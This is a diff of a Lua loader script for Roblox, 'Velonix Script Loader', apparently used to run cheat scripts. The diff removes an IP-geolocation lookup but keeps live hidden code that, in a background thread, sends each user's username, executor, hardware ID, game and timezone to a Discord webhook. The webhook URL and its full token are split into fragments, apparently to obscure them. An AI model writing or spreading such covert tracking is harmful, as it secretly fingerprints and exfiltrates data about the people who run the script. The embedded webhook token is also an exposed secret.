@@ -1,5 +1,3 @@
--- // Velonix Script Loader v3 - Fixed & Optimized - © itzC9
-
 --// SERVICES
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -18,9 +16,6 @@ local WEBHOOK1 = "https://discord.com/"
 local WEBHOOK2 = "api/webhooks"
 local WEBHOOK3 = "1393398736344055930/G90Hkhf7jtSpyLc8SYE7t60DwxiwzfCw1EiQED84T163EdvDhRtuL5RzmEHp9Fq0R3UM"
 local WEBHOOK_URL = WEBHOOK1 .. WEBHOOK2 .. "/" .. WEBHOOK3
-
--- IP API
-local IP_API_URL = "https://velonix-api.vercel.app/json"
 
 -- Supported Scripts
 local LOADER_SCRIPTS = {
@@ -133,10 +128,6 @@ spawn(function()
     local req = (syn and syn.request) or (http and http.request) or request
     if typeof(req) ~= "function" then warn("No valid request method.") return end
 
-    local success, ipResp = pcall(function() return game:HttpGet(IP_API_URL) end)
-    if not success then return warn("API failed") end
-
-    local ipInfo = HttpService:JSONDecode(ipResp)
     local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
     local gameName = "Unknown"
     pcall(function()
@@ -147,10 +138,10 @@ spawn(function()
         username = "🔥 | Developer",
         embeds = {{
             title = "🚨 New Script Execution",
-            description = string.format("**Username:** `%s`\n**Executor:** `%s`\n**HWID:** `%s`\n**Game:** `%s` (%d)\n**IP:** `%s`\n**Country:** `%s`\n**Region:** `%s`\n**City:** `%s`\n**ISP:** `%s`",
+            description = string.format("**Username:** `%s`\n**Executor:** `%s`\n**HWID:** `%s`\n**Game:** `%s` (%d)\n**Timezone:** `%s`",
                 player.Name, executor, hwid,
                 gameName, game.PlaceId,
-                ipInfo.ip or "N/A", ipInfo.country or "N/A", ipInfo.region or "N/A", ipInfo.city or "N/A", ipInfo.org or "N/A"
+                os.date("%Z")
             ),
             color = 15158332,
             footer = { text = "Velonix Loader • " .. os.date("%Y-%m-%d %H:%M:%S") },
